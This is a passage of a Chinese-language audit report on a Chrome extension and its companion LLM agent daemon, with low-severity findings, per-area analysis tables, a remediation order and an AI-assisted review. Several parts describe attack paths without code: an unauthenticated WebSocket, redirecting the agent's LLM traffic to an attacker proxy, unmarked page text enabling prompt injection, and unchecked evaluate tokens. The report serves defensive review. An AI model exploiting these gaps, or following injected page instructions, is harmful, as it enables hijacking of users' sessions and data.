### Finding: L6 HighlightedCode 分词器对 CJK 失效
- Severity: Low
- Confidence: High
- Category: Maintainability
- Status: Confirmed
- Affected area: sidepanel App.tsx
- Evidence:
  - File: `chrome-extension/src/sidepanel/App.tsx:250-272`
  - Function/Module: HighlightedCode
  - Behavior: code.split(/(\b)/) + 硬编码 keyword。\b 是 ASCII 边界，两 CJK 字符间不存在；中文/emoji 标识符成一巨 token；多 token 字串正则也失败。
- Problem: 安全弹窗 code 预览（常含中文注释/字符串）高亮失效或误色。
- Why it matters: 用户读 code 处高亮错侵蚀信任。
- Realistic failure scenario: evaluate 预览 function 执行危险操作()——function 关键词可能不高亮因尾部 () 粘 CJK。
- Minimal fix: 用 highlight.js/prismjs（处理 CJK 边界）或移除高亮。
- Better long-term fix: 复用成熟高亮库 + 主题一致。
- Regression test suggestion: 快照 HighlightedCode({code:"function 测试() { return '你好' }"})。
- Estimated effort: 0.5 天。

### Finding: L7 Mermaid pending 标志竞态 → 图静默丢弃
- Severity: Low
- Confidence: Medium
- Category: Frontend-State
- Status: Suspected
- Affected area: sidepanel mermaid 渲染
- Evidence:
  - File: `chrome-extension/src/sidepanel/components/mermaid.ts:108-109/116`
  - Function/Module: renderMermaidBlocks
  - Behavior: pending 标志同步设于 await 前；React 重注入 HTML 时旧 pre 闭包解析在脱离节点，新 pre 无 dataset 且若 html 未变不再 re-process。
- Problem: 罕见竞态，但命中时用户见 mermaid 源码非图无错误标签。
- Why it matters: 错误路径也操作旧 pre。
- Realistic failure scenario: 用户编辑消息（regenerate）；markdown 重解析；进行中 mermaid 渲染在脱离节点解析；新节点图静默丢。
- Minimal fix: !pre.isConnected 守卫触发后重查并重试；或 MarkdownRenderer effect cleanup 重调 renderMermaidBlocks。
- Better long-term fix: 渲染状态机 + 取消。
- Regression test suggestion: mock mermaid.render next-tick 解析；触发两次快速 html 变；断言最终 DOM 有 SVG。
- Estimated effort: 0.5 天。

### Finding: L8 agentStore 浅 merge 中途覆盖数组
- Severity: Low
- Confidence: High
- Category: Frontend-State
- Status: Confirmed
- Affected area: sidepanel agentStore
- Evidence:
  - File: `chrome-extension/src/sidepanel/store/agentStore.tsx:217-218`；`useWebSocket.ts:259-263`
  - Function/Module: SET_CONFIG reducer、config.updated
  - Behavior: {...state.config,...action.config} 数组被替非合并；companion 推 config.updated 时覆盖用户 textarea 进行中编辑。
- Problem: 用户中途编辑被 companion 同步覆盖。
- Why it matters: companion 配置更新来自另一面板/实例；用户未保存编辑消失。
- Realistic failure scenario: 用户粘 5 trusted 域入 textarea；companion 推 0 域更新；textarea 重置中打字。
- Minimal fix: 跟踪 dirty 状态；dirty 时拒 companion 推送；或禁 textarea 同步中。
- Better long-term fix: 编辑 buffer + 显式保存。
- Regression test suggestion: reducer 测 SET_CONFIG 带 trusted_domains 而 dirty 时保留。
- Estimated effort: 0.5 天。

### Finding: L9 handleSend 快速 Enter 双发
- Severity: Low
- Confidence: Medium
- Category: Frontend-State
- Status: Confirmed
- Affected area: sidepanel App.tsx InputArea
- Evidence:
  - File: `chrome-extension/src/sidepanel/App.tsx:462-525/439/509`
  - Function/Module: handleSend、handleKeyDown、canSend
  - Behavior: canSend 在 setText("") 异步生效前据旧 text 仍 true；键盘重复/快双击可再入。SET_PROCESSING 异步；isStreaming 依赖 streamingContent 不够快。
- Problem: 无防重入。双倍用户消息+双 chat.send。
- Why it matters: 线程双倍消息；不应依赖 companion 去重。
- Realistic failure scenario: 用户按住 Enter；首流式 token 前发 3 chat.send。
- Minimal fix: sendingRef useRef(false)；handleSend 起置 true 末 false；true 时早返。
- Better long-term fix: 请求状态机 + 幂等键。
- Regression test suggestion: 组件测同步两 Enter keydown；断言一次 sendMessage。
- Estimated effort: 1 小时。

### Finding: L10 sql.js 每 save 重导整库 + 消息每轮 O(n²) 重建
- Severity: Low
- Confidence: High
- Category: Performance
- Status: Confirmed
- Affected area: companion history + adapter
- Evidence:
  - File: `companion/src/history/store.ts:263-280`；`companion/src/llm/adapter.ts:229`
  - Function/Module: save、context truncation
  - Behavior: save 做 db.export()（O(n) 整库）；若每写 flush（C2 修复）则每 tool call 重导整库。adapter 每轮 JSON.stringify(messages) 重算（O(n²) 跨 100 轮）。
- Problem: 若采每写 flush 则磁盘 IO bound；长 agent 跑消息重建慢。
- Why it matters: 规模退化。
- Realistic failure scenario: 5MB history.db 每 tool call 5MB writeFileSync；100 轮长线程消息 stringify 累积。
- Minimal fix: DB flush debounce；adapter 增量记序列化长度。
- Better long-term fix: 迁 better-sqlite3（无需 export）。
- Regression test suggestion: 基准 1000 记录 flush < 阈值。
- Estimated effort: 1h–1 天。

### Finding: L11 history.db / thread JSON 无 schema 迁移
- Severity: Low
- Confidence: High
- Category: Data-Integrity
- Status: Confirmed
- Affected area: companion history + threads
- Evidence:
  - File: `companion/src/history/store.ts:282-298`；`companion/src/threads/thread-manager.ts:7-23/209-218`
  - Function/Module: initSchema、Thread interface/get
  - Behavior: 仅 CREATE TABLE IF NOT EXISTS，无 PRAGMA user_version；Thread 无 schema_version，靠 inline backfill 不持久化仅处理 2 字段。
- Problem: 未来 schema 变（如加 cost_usd）旧 db 不迁移；INSERT 静默失败或抛破流式回路。
- Why it matters: 任何 schema 变静默破旧文件。
- Realistic failure scenario: 加 operations.cost_usd 列；旧 history.db init 不加列；INSERT 失败。
- Minimal fix: 加 PRAGMA user_version + 迁移 switch；Thread 加 schema_version + migrateThread()。
- Better long-term fix: 迁移框架 + 回滚。
- Regression test suggestion: 旧 schema db 经迁移含新列。
- Estimated effort: 1 小时。

### Finding: L12 无 WS health/readiness 端点；无 metrics/tracing
- Severity: Low
- Confidence: High
- Category: Observability
- Status: Confirmed
- Affected area: companion server
- Evidence:
  - File: `companion/src/server.ts:1287`；`settings-web.ts:335`
  - Function/Module: WS server、/api/health
  - Behavior: WS 端口无 HTTP/healthz；唯一 health 在 settings-web 另端口另 token。无 metrics（tool.calls/llm.latency/security.confirmations）。无 tracing。
- Problem: 无人值守 daemon 无监控面；无编程式"WS 是否活"检查。
- Why it matters: daemon 楔住（accept loop 卡）无健康检查告警。
- Realistic failure scenario: daemon 楔住；无健康检查告警；用户以为 agent 在工作。
- Minimal fix: WS 端口加小 HTTP /healthz（uptime/ws_clients/threads_active）；可选 /metrics Prometheus。
- Better long-term fix: OTel tracing + 仪表盘。
- Regression test suggestion: /healthz 返 200 + 字段。
- Estimated effort: 0.5 天。

### Finding: L13 文档漂移
- Severity: Low
- Confidence: High
- Category: Documentation
- Status: Confirmed
- Affected area: CLAUDE.md / TESTING.md / 06-23 审计
- Evidence:
  - File: `CLAUDE.md`、`docs/TESTING.md:28-35`、`docs/audit/diagnosis-2026-06-23.md`
  - Function/Module: 计数/文件列表/审计标注
  - Behavior: CLAUDE.md 称 29 测试文件（实际 39）；TESTING.md 列 4 含已删 server.test.ts；06-23 [C-SEC-3] 称 settings-web CSRF/SSRF 未防（实际 :285-298 已补 hostOk/originOk/token/SSRF）、[C-SEC-1] 称 history.db 默认 umask（实际 0o600）。
- Problem: 新贡献者/审计者被误导；06-23 最响 critical 已修浪费再审。
- Why it matters: 文档信任侵蚀；审计者重找已修问题；操作者漏看真问题。
- Realistic failure scenario: 审计者花时间"修"已修的 settings-web CSRF。
- Minimal fix: 重生成 TESTING.md（find tests）；更新计数；06-23 加 [PATCHED] 标注；Common Issues 加模型名/配置损坏/测试 hang。
- Better long-term fix: 文档 CI 校验（计数自动同步）。
- Regression test suggestion: 文档计数脚本匹配实际。
- Estimated effort: 0.5 天。

### Finding: L14 版本策略不齐
- Severity: Low
- Confidence: High
- Category: Release
- Status: Confirmed
- Affected area: 多 package.json
- Evidence:
  - File: `companion/package.json:3`、`chrome-extension/package.json:4`
  - Function/Module: version 字段
  - Behavior: companion 0.2.0 vs extension 0.1.0；DMG 用 companion 版本；无 CHANGELOG；git tag 空；无 Releases。两半紧耦合（WS 协议/共享 config schema）但独立版本无兼容检查。
- Problem: ext 0.1.0 配 companion 0.2.0 无协议版本协商检测不匹配；bug 报告"我在 0.2.0"歧义。
- Why it matters: 支持负担 + 不可复现。
- Realistic failure scenario: 扩展加新 WS 消息类型；旧 companion 拒；用户报"chat 坏"无版本信号。
- Minimal fix: 统一 version 或加 protocol_version 在 WS connected 握手交换拒不匹配；加 CHANGELOG；tag 发布。
- Better long-term fix: 单仓统一版本 + 兼容矩阵。
- Regression test suggestion: WS 握手 protocol_version 不匹配时拒。
- Estimated effort: 0.5 天。

### Finding: L15 Mermaid/KaTeX bundle 重量
- Severity: Low
- Confidence: High
- Category: Dependency-Weight
- Status: Confirmed
- Affected area: chrome-extension bundle
- Evidence:
  - File: `chrome-extension/build/chrome-mv3-prod/*.js`（10+ >100k chunk）
  - Function/Module: mermaid per-diagram 解析器
  - Behavior: find ... -size +100k 返 10+ chunk（kanban/journey/classDiagram-v2/packet/railroad/radar/pegDiagram/flowDiagram/diagram）。mermaid 全捆绑（ADR-009 已懒加载缓解）。
- Problem: 多数用户仅用 flowchart/sequence 但发全部 20+ 类型；MV3 strict CSP + SW 内存限使重 bundle 慢。
- Why it matters: 首装性能。
- Realistic failure scenario: 慢连接用户首次 mermaid 渲染拉多个 100k+ chunk。
- Minimal fix: defineConfig 仅注册 flowchart/sequence/class 插件。
- Better long-term fix: 按需动态加载图类型。
- Regression test suggestion: bundle 分析断言图类型 chunk 限白名单。
- Estimated effort: 0.5 天。

### Finding: L16 menu-bar companionClient 无限重连噪声
- Severity: Low
- Confidence: High
- Category: Observability
- Status: Confirmed
- Affected area: companion menu-bar-agent
- Evidence:
  - File: `companion/src/menu-bar-agent.ts:557`
  - Function/Module: companionClient reconnect
  - Behavior: maxReconnectAttempts:-1（设计如此）；companion 永久下时无界失败重连尝试，CPU/日志噪声。MCP sliding-window 断路器是好的（亮点）。
- Problem: companion 永久下时托盘无界重连噪声。
- Why it matters: 日志噪声/CPU。
- Realistic failure scenario: companion 永久停；托盘每秒重连产噪声。
- Minimal fix: 退避上限或静默。
- Better long-term fix: 断路器（同 MCP 模式）。
- Regression test suggestion: companion 不可达时重连退避。
- Estimated effort: 30 分钟。

### Finding: I1 settings-web 已补齐 CSRF/SSRF/Host/Origin 四重门（06-23 审计过时）
- Severity: Info
- Confidence: High
- Category: Documentation
- Status: Confirmed
- Affected area: settings-web.ts
- Evidence:
  - File: `companion/src/settings-web.ts:285-315/192`
  - Function/Module: hostOk/originOk/token-gate/hostnameIsBlocked
  - Behavior: 每请求 hostOk+originOk+token 门 + SSRF hostnameIsBlocked。06-23 [C-SEC-3] 称未防，已过时。
- Problem: 审计文档未标注已修。
- Why it matters: 重审浪费。
- Realistic failure scenario: 审计者据 06-23 误报 settings-web 为 critical 未防。
- Minimal fix: 06-23 加 [PATCHED: settings-web.ts:285-298]。
- Better long-term fix: 审计闭环标注流程。
- Regression test suggestion: 文档标注存在。
- Estimated effort: 10 分钟。

### Finding: I2 systray2 二进制 SHA256 校验进 CI（供应链亮点）
- Severity: Info
- Confidence: High
- Category: Supply-Chain
- Status: Confirmed
- Affected area: scripts/verify-systray2.js + ci.yml
- Evidence:
  - File: `scripts/verify-systray2.js`、`.github/workflows/ci.yml`
  - Function/Module: verify-systray2 --strict
  - Behavior: CI 步校验 systray2 二进制 SHA256（systray2-sha256.json）。
- Problem: 亮点，无风险。
- Why it matters: 值得保留的供应链实践。
- Realistic failure scenario: 无。
- Minimal fix: 无；建议同样模式应用到 Node 下载（H8）。
- Better long-term fix: 复用该模式校验所有外部下载。
- Regression test suggestion: 无。
- Estimated effort: 无。

### Finding: I3 多处安全注释诚实标注残余风险
- Severity: Info
- Confidence: High
- Category: Comment-Coverage
- Status: Confirmed
- Affected area: 跨源码 NOTE 注释
- Evidence:
  - File: `server.ts:453`（tabUrlCache 页面导航）、`store.ts:302`（脱敏理由）、`index.ts:282`（token 移除）
  - Function/Module: 各 NOTE
  - Behavior: 多处诚实标注已知残余风险与历史决策理由。
- Problem: 亮点，值得保留的文化。
- Why it matters: 降低未来回归风险。
- Realistic failure scenario: 无。
- Minimal fix: 无；鼓励该实践延续。
- Better long-term fix: 无。
- Regression test suggestion: 无。
- Estimated effort: 无。

---

## 5. Architecture Analysis

- Coverage: High · Inspected: server.ts/message-router.ts/adapter.ts/browser-bridge.ts/App.tsx 全读 + ADR-001~009 · Exclusions: 无运行时追踪。

| Subtype | Count | Affected Areas | Action |
|---|---|---|---|
| ModuleBoundary | 1 | WS 控制面无信任边界（C1） | 加 verifyClient+握手 |
| StateOwnership | 2 | 连接状态三处（M13）；history 无持久归属（C2） | 单一源 + flush |
| BoundaryContract | 1 | WS 协议 any 无契约（M21） | discriminated union |
| EvolutionRisk | 1 | thread JSON 无版本（L11） | schema_version |

**架构总结：** 双层拓扑清晰（A1）、回路设计合理（A2）。主要架构风险是**信任根未在 WS 边界建立**（C1，连带 M2/M3/M5/M22 可利用性），以及**持久化层无原子性/无迁移**（H3/H4/L11/C2）。依赖方向总体正确（扩展↔companion 单一 WS，无循环）。

## 6. Security Concerns

- Coverage: High · Inspected: security*.ts、tool-definitions、message-router 闸门、browser-bridge、page-sanitizer、config.ts、server.ts:1287/1522 复核、matchDomain 10 用例脚本 · Exclusions: 无动态 PoC。

Confirmed: C1（根因）、C4、H1、H2、H9、M1、M2、M3、M4、M5、M7、L1、L3。Suspected: M22。

**Verified 安全/已缓解：** HMAC 常量时间+TTL+一次性 ✓；osascript execFile argv 非 shell ✓；skill zip 防穿越 ✓；matchDomain 通配符正确（10 用例）✓；import SSRF 防护合理 ✓；checkHighRiskExecution 正确为 risk-preview-only ✓；history 脱敏 ✓；掩码 key 往返 ✓；settings-web 四重门 ✓；WS 绑 127.0.0.1+10MB cap+ping ✓。

**结论：** 安全细节扎实，但**信任根（WS）零鉴权**是系统性缺陷。修 C1 是最高杠杆。

## 7. Stability Concerns

- Coverage: High · Inspected: store.ts、shutdown、daemon.ts、mcp/manager.ts、adapter 重试、index.ts handler。

Confirmed: C2、H3、H5、M6、M8、M9、M10、M11、L10、L11。Suspected: M10/M11。

亮点: MCP sliding-window 断路器、maxRetries:0+CONTINUOUS_FAILURE_LIMIT、MAX_TOOL_CALL_ROUNDS=100、UDS 锁 EADDRINUSE 兜底。

**结论：** 持久化+shutdown 路径集中失守（C2+H3+H5+M9），是稳定性主债务。

## 8. Performance Concerns

- Coverage: Medium · Inspected: 渲染路径、adapter 重建、store export、bundle · Exclusions: 无 profiling。

Confirmed: M15、M16、M20、L10、L15。

**结论：** 多为规模退化非已坏；单用户负载下潜伏。M20 兼成本风险。

## 9. Testing Gaps

- Coverage: High · Inspected: ci.yml、39 文件采样 6、直接跑 npm test 复现 hang。

Confirmed: C3、H7。**关键路径零覆盖：** server WS handler、message-router tool loop、thread 隔离、并发连接、SecurityConfirmationManager 集成（5 红）、前端零组件测试、零 e2e。`adapter.test.ts` 当前 0 用例。

**结论：** CI 执法破坏（C3）比"测试少"更致命。修 C3 是前提。

## 10. Maintainability Concerns

- Coverage: High · Inspected: 全 >500 行文件、agentStore、any 统计（205）、docs。

Confirmed: M12、M14、M13、M21、M17、L4、L13、L14。

亮点: 9 ADR、代码可读、安全注释诚实、companion tsc 干净、结构清晰。

## 11. Design / Principles Concerns

- Coverage: High · Inspected: 巨型文件、fallback 路径、CQS 违例、catch 模式。

违反: SRP 1.1（App.tsx/useWebSocket/server.ts/message-router/skill-engine）、Fail-Fast 4.4（config 默认/history no-op/C2）、CQS 3.2（saveConfig）、KISS 4.3（HighlightedCode）、File Size 1.2（6 文件 >500）、Config Over Hardcoding 9.1（M19）。
遵循（亮点）: fail-fast 多处（validateWsMessage/matchDomain/execFile）、DRY 基本到位、defense-in-depth（mermaid）、least privilege（默认 false/trusted_domains）。

## 12. Release Concerns

- Coverage: High · Inspected: ci.yml、package.sh/create-dmg.sh/build-windows-exe.ps1、verify-systray2.js、dist-package。

Confirmed: C3、C4、H6、H7、H8、M19、M20、M8、L12、L13、L14、C2、H3、H4。

**结论：** 发布就绪度 Poor（3.0）。最低成本供应链胜场：先校验 Node SHA256。

## 13. Documentation Analysis

- Coverage: Medium · Inspected: docs/*、9 ADR、audit-report-2026-06-05、diagnosis-2026-06-23 · Exclusions: 未逐链接校验。

| Subtype | Count | Affected | Action |
|---|---|---|---|
| StaleDocs | 3（L13） | CLAUDE.md/TESTING.md/06-23 审计 | 重生成+[PATCHED] |
| OperatorDocs | 1（L13） | TROUBLESHOOTING 缺模型名/损坏/hang | 补 Common Issues |
| DecisionRecord | 0 | ADR-001~009 高质量 | — |

## 14. Observability / Operability Analysis

- Coverage: Medium · Inspected: logger.ts、server.ts 日志点、settings-web /api/health。

| Subtype | Count | Missing | Action |
|---|---|---|---|
| Logging | 2（M7/M8） | URL/params 脱敏、0o600、retention | 复用 history 脱敏+轮转 |
| Metrics | 1（L12） | tool.calls/llm.latency/confirmations | 聚合 JSONL |
| HealthCheck | 1（L12） | WS healthz | 加 /healthz |
| Debuggability | 1（C2） | 历史不落盘=无取证 | 修 C2 |

## 15. Configuration Safety Analysis

| Subtype | Count | Affected | Action |
|---|---|---|---|
| SchemaValidation | 1（H4） | config.ts 无 zod | 启动校验 |
| UnsafeDefault | 2（M19/H4） | deepseek-v4-flash；损坏回默认 | 改 deepseek-chat+loud error |
| SecretConfig | 2（H1/L2） | config.json 0644；storage.local 明文 | 0o600+威胁模型 |
| ConfigDocs | 1（L13） | TROUBLESHOOTING | 补 |

## 16. Data Integrity Analysis

| Subtype | Count | Invariants at Risk | Action |
|---|---|---|---|
| TransactionBoundary | 1（C2） | history 不落盘 | flush+close |
| ConcurrencyConsistency | 2（H5/M10） | saveConfig 竞态；abort 孤儿 | mutex+abort 检查 |
| MigrationSafety | 1（L11） | history/thread 无迁移 | user_version+migrate |
| BackupRestore | 1（H3） | 非原子写→截断 | tmp+rename |

## 17. Privacy / Data Governance Analysis

- Coverage: Medium · Inspected: history 脱敏、logger、page-sanitizer、obsidian 档案、analyze_image · Exclusions: 未审计 provider 侧。

| Subtype | Count | Affected | Action |
|---|---|---|---|
| AccessBoundary | 2（M4/M5） | analyze_image 带 cookie；cookie/httpOnly 原样 | 确认门+扩展 trust |
| Minimization | 1（M7） | logger 记 URL/params | 脱敏 |
| Retention | 1（M8） | 日志无界 | 轮转 |
| Export | 1（M22） | history.export 自批准 | 继承 C1 |

## 18. Accessibility / UX Correctness Analysis

- Coverage: Medium · Inspected: SecurityConfirmationDialog、各 modal、ChatView · Exclusions: 未跑 axe/Playwright。

| Subtype | Count | Affected | Action |
|---|---|---|---|
| KeyboardFocus | 3（H10/M18/L5） | 安全弹窗/modals 无 trap+Esc；自动滚动 | Modal primitive+贴底 |
| SemanticStructure | 1（H10） | 无 fieldset/legend/role | 补 ARIA |
| LoadingState | 1（M13） | 重连按钮安慰剂 | reconnect.now |

## 19. Supply Chain / Reproducibility Analysis

| Subtype | Count | Surface | Action |
|---|---|---|---|
| DependencyProvenance | 1（C4） | decompress zip-slip | 升级/换+audit 门 |
| Reproducibility | 1（H8） | Node 未校验、无 SBOM | SHASUMS256+cyclonedx |
| CIIntegrity | 1（C3） | \|\| true 吞失败 | 移除+修 hang |
| ArtifactProvenance | 1（H8） | 无签名/公证 | codesign/notary/signtool |
| RegistryHygiene | 1（H6） | 67 ext high | overrides+上游 |

## 20. Cost / Resource Economics Analysis

| Subtype | Count | Driver | Action |
|---|---|---|---|
| LLMCost | 1（M20） | 无 token/并发预算；context=1e6 | per-thread cap+usage+daily budget |
| ObservabilityCost | 1（M8） | 日志无界 | 轮转 |
| CostVisibility | 1（M20） | 不记 usage | 日志记 usage |

## 21. AI / LLM Safety Analysis

| Subtype | Count | Boundary | Action |
|---|---|---|---|
| PromptInjection | 1（M2） | 页面文本原样入 LLM | companion 输入侧标记 |
| ToolAuthorization | 2（H2/H9） | evaluate token 未校；扩展零门 | validateToken+AST gate |
| AbuseCost | 1（M20） | 无预算 | 同上 |
| EvalGap | 1（info） | 无注入/策略 eval | 加 promptfoo/deepeval |

## 22. Fallback / Defensive Code Analysis

- Coverage: Medium · Inspected: config/history/adapter catch、mcp catch、unhandledRejection。

| Subtype | Count | KeepWithAlert | FailFast | Remove |
|---|---|---|---|---|
| SilentFallback | 2（C2 history no-op、H4 config 默认） | 2 | 0 | 0 |
| EmptyCatch | 多（mcp/manager.ts:61/111/117/129/153/204/267；thread-manager.ts:192/319） | 多 | 0 | 0 |
| SilentCorrection | 1（config deepMerge 回退） | 1 | 0 | 0 |

**建议：** 裸 catch {}/.catch(()=>{}) 换 catch(e){logger.warn(...)}，保 no-op 语义但留信号。

## 23. Testing Authenticity Analysis

- Coverage: Medium · Inspected: 采样 6 测试文件 · Exclusions: 未全量审计 39。

| Test Area | Real Confidence | Risk | Action |
|---|---|---|---|
| config.test.ts（17/17） | High | 低 | Keep |
| page-sanitizer.test.ts | High | 中（仅测 11 模式） | Keep+文档局限 |
| security-policy.test.ts | Medium（hang） | 拆卸 hang 掩盖 | 修 teardown |
| security-gates.test.ts | None（5 红+hang） | 安全闸门回归零信号 | 修 C3 |
| sidepanel-state.test.ts | High（纯 reducer） | 组件零覆盖 | 补组件测试 |
| adapter.test.ts | None（0 用例） | 流式/tool loop 零覆盖 | 补 |

## 24. Type Safety Analysis

| Subtype | Count | Critical | High | Med | Low |
|---|---|---|---|---|---|
| TypeAssertion | 多（205 any） | 0 | 0 | 1（M21） | 多 |
| InputBoundary | 1（H7/M21） | 0 | 1 | 0 | 0 |

companion tsc 干净（好）；extension 9 错发布（H7）；WS 协议 any（M21）。

## 25. Frontend State Analysis

| Subtype | Count | Affected |
|---|---|---|
| ComponentSize | 1（M12） | App.tsx 1104 |
| StateDuplication | 2（M13/L8） | 连接状态三处；config 浅 merge |
| EffectChain | 2（L5/L7） | 自动滚动；mermaid pending |
| UIBusinessCoupling | 2（M12/M14） | 安全弹窗在 App；下载/quick-action 在 hook |
| RenderPerf | 2（M15/M16） | 无虚拟化；每 token 重渲染 |
| RequestState | 2（M13/L9） | 重连安慰剂；handleSend 双发 |

## 26. Backend API Analysis（WS 消息协议）

| Subtype | Count | Affected |
|---|---|---|
| Validation | 1（M21） | validateWsMessage any 手写 |
| Auth | 1（C1） | 无 WS 鉴权 |
| ErrorResponse | 1（M7） | 错误消息含 params 回显 |

## 27. Dependency Weight Analysis

| Dependency | Status | Used For | Action |
|---|---|---|---|
| mermaid@11.16 | Healthy（已懒加载） | 图渲染 | 仅注册常用类型（L15） |
| sql.js@1.14 | Overweight（全内存+export） | history.db | 迁 better-sqlite3（L10） |
| officeparser@4.1 | Overweight+漏洞 | office 解析（引 decompress） | 升 7.x/换（C4） |
| openai@4.52 | Healthy（form-data high 传递） | LLM | audit fix |
| zod/ws/dompurify/marked/katex/react | Healthy | — | — |

## 28. Code Consistency Analysis

- Coverage: Medium · Inspected: 错误处理/catch/命名跨文件采样 · Exclusions: 未跑 eslint 全量。

| Subtype | Count | Affected | Action |
|---|---|---|---|
| ErrorHandling 模式不齐 | 多 | mcp/manager 多处 .catch(()=>{}) vs server.ts 有 summarizelogger | 统一 catch+log |
| 写入模式不齐 | 1 | 多数 writeFileSync 非原子 vs menu-bar-agent STATUS_FILE 原子 | 抽 atomicWriteJSON（H3） |
| 死代码并存 | 1（L4） | 两套 InputArea | 删/迁移 |
| 注释语言混杂 | 1 | 中英混 | 低优，不影响正确性 |

## 29. Comment Coverage Analysis

- Coverage: Low · Inspected: 抽样关键文件注释密度 · Exclusions: 未全量统计。

| Subtype | Count | Affected | Action |
|---|---|---|---|
| 公共 API 缺文档 | 1 | WS 消息协议（M21 同源） | 加 discriminated union + 注释 |
| 诚实 NOTE（亮点） | 1（I3） | server.ts/store.ts/index.ts | 保留 |
| Stale 注释 | 1（L13 同源） | 计数/审计标注 | 同步 |

**结论：** 注释覆盖整体良好（安全注释尤其诚实），主要缺口是协议边界缺类型化文档（与 M21 同源）。

---

## 30. Principles Compliance

### Principles Violated

| Principle | Violations | Severity | Affected Areas |
|-----------|------------|----------|----------------|
| Single Responsibility (1.1) | 5 | Medium-High | App.tsx, useWebSocket, server.ts, message-router.ts, skill-engine.ts |
| Fail-Fast (4.4) | 3 | High | config.ts:196, store.ts:240, C2 |
| Command-Query Separation (3.2) | 1 | Medium | saveConfig |
| No Shared Mutable State (5.4) | 2 | Medium | saveConfig 无锁, tabUrlCache（best-effort 缓解） |
| KISS (4.3) | 1 | Low | HighlightedCode |
| File Size Limit (1.2) | 6 | Medium | App.tsx/server.ts/message-router/skill-engine/browser-bridge/adapter |
| Configuration Over Hardcoding (9.1) | 1 | Medium | deepseek-v4-flash（M19） |

### Principles Respected

- fail-fast 在 validateWsMessage/matchDomain/execFile argv 多处落实
- DRY 基本到位（少量重复如 useWebSocket 下载代码）
- defense-in-depth（mermaid strict+htmlLabels:false+DOMPurify SVG profile）正确
- least privilege（cookie trusted_domains、auto_approve_dangerous 默认 false）
- 诚实标注残余风险（多处 NOTE，文化值得保留）

---

## 31. Recommended Fix Order

### Fix Immediately（数据丢失/安全突破/服务中断）

1. **C1 WS 鉴权**（verifyClient+Origin，2–4h）— 最高杠杆，连带缓解 M2/M3/M5/M22
2. **C2 history 落盘+shutdown close**（1h）
3. **H1 config.json 0o600**（15 分钟）
4. **H2 evaluate validateToken**（30 分钟）

### Fix Before Stable Release

5. **C3 移除 \|\| true+修 hang+分诊 5 红**（0.5 天）
6. **C4+H6 npm audit fix+officeparser 升级+audit 门**（1–3 天）
7. **H3+H4+H5 原子写+zod+mutex**（2–3 天，同批）
8. **H7 扩展 tsc 修 9 错+CI tsc 门**（0.5 天）
9. **H8 至少先校验 Node SHA256**（0.5 天）；签名/公证随证书（2–5 天）
10. **H9 evaluate 扩展端文档/AST 门**（0.5–3 天）
11. **H10+M18 Modal primitive+安全弹窗 a11y**（0.5–1 天）

### Schedule Later

12. M2/M3/M4/M5/M6/M9/M10/M11/M12/M14/M15/M16/M17/M20/M21/M22 + 全部 Low

### Ignore for Now

L1/L2/L3/L6/L7/L10/L11/L15/L16（部分）—— 纳入技术债清单，触及相关代码时顺手修。

---

## 32. Quick Wins（低成本高价值，多数 ≤2h）

| Quick Win | Effort | Removes Risk |
|---|---|---|
| config.json 写加 {mode:0o600}+chmod 已存 | 15 分钟 | H1 |
| evaluate 转发前 validateToken | 30 分钟 | H2 |
| WS verifyClient 加 Origin 检查 | 30 分钟 | C1（网页向量） |
| shutdown 调 historyStore.close() | 30 分钟 | C2（临时缓解） |
| record() 末尾 save()（原子写） | 1h | C2 |
| saveConfig 包 promise 队列 | 1h | H5 |
| 默认模型改 deepseek-chat | 15 分钟 | M19 |
| unhandledRejection 改 exit | 30 分钟 | M6 |
| 日志文件 0o600+复用 redactForStorage | 1h | M7 |
| 删死代码 InputArea/ConnectionStatus | 1h | L4 |
| handleSend sendingRef 防重入 | 1h | L9 |
| 移除 CI \|\| true | 5 分钟 | C3（暴露真实状态） |

---

## 33. Long-term Refactor Plan

1. **WS 协议类型化**（M21）— discriminated union+zod 替 validateWsMessage(any)。动机：安全边界零编译期强制。方式：渐进 union→zod。风险：大面积 handler 签名。测试：编译期+每 handler 单测。effort 1–2 天。
2. **前端 god-file 拆分**（M12/M14）— App.tsx 拆 6 组件；useWebSocket 抽 messages/。动机：SRP/可测/PR 噪声。方式：纯重构+快照。风险：低。测试：快照+smoke。effort 1–2 天。
3. **history 迁 better-sqlite3**（C2/L10）— 原生 WAL 无需 export。动机：修 C2 根因+解 O(n) export。风险：原生模块跨平台打包（canvas 先例）。测试：并发写+崩溃恢复。effort 1 天。
4. **Modal/focus-trap primitive**（H10/M18）— 单 <Modal> trap+Esc+还原，四 modal 复用。动机：a11y 一致+安全弹窗可达。测试：Playwright 每 modal。effort 0.5–1 天。
5. **成本/可观测性面**（M20/L12）— per-thread LLM cap+usage 日志+/healthz+/metrics。动机：无人值守 daemon 缺监控+无界花费。effort 1–2 天。

---

## 独立复核（Kimi Code, 2026-07-09）

审计交付后，独立启动 Kimi Code 对 4 个 Critical 做对抗式复核（读真实代码 + 自起 ws 服务 curl 握手 PoC + 重跑 `npm test`/`npm audit`）。**4 个 Critical 全部 CONFIRM**，并纠正 3 处：

- **C1 浏览器网页向量**：原报告暗示任意 evil.com 可连。**修正**：HTTPS 页面被 Mixed Content 拦截 `ws:`，仅 HTTP 页面可连——网页向量真实但窗口窄；Critical 仍成立（本地进程向量就足够，curl 实测零摩擦握手成功）。
- **C1 漏攻击路径**：补充 `config.set` 可改 LLM `base_url`/`api_key` → 对话流量重定向到攻击者代理（会话劫持/数据渗漏），比单纯 evaluate 更隐蔽。
- **C4 版本笔误**：officeparser 实际 4.2.0（非 4.1.0），引入有漏洞的 decompress 路径一致。

**优先级修正（采纳）**：Kimi 指出 **C3（移除 `|| true`）应最先做**——它是验证 backbone，C1/C2/C4 的任何修复都需 CI 来证明测试通过；CI 绿-on-red 时无法信任修复结果。详见 `docs/remediation-plan-2026-07-09.md` 的修订排序。

**Kimi 总评**："偏严但证据扎实，结论基本可信。"

---

*报告遵循 Fuck My Shit Mountain skill `templates/audit-report.md` 与 `rubrics/*`。所有 Critical/High 含 file:line 直接证据；Confirmed/Suspected 已分离；无伪造发现；4 个 Critical 经 Kimi Code 独立对抗复核确认。*
